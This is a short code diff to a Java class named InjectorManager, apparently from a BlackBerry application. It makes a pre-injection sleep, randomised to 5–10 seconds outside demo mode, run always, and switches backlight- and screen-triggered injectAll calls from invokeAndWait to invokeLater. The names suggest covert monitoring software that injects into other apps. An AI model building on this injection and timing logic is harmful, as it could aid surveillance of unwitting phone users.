@@ -253,13 +253,11 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             Debug.ledStart(Debug.COLOR_ORANGE);
         }
 
-        //#ifndef BBM_DEBUG
         if (Status.self().isDemo()) {
             Utils.sleep(1000);
         } else {
             Utils.sleep(Utils.randomInt(5, 10) * 1000);
         }
-        //#endif
 
         if (wantLight) {
             Debug.ledStop();
@@ -461,7 +459,6 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
 
                     }
                 }
-
             }
         } finally {
             //Main.getInstance().popBlack();
@@ -576,7 +573,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         debug.trace("runOnBacklight");
         //#endif
 
-        UiApplication.getUiApplication().invokeAndWait(new Runnable() {
+        UiApplication.getUiApplication().invokeLater(new Runnable() {
             public void run() {
                 injectAll();
             }
@@ -611,7 +608,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
                     debug.trace("onApplicationChange: screen found");
                     //#endif
 
-                    UiApplication.getUiApplication().invokeAndWait(
+                    UiApplication.getUiApplication().invokeLater(
                             new Runnable() {
 
                                 public void run() {
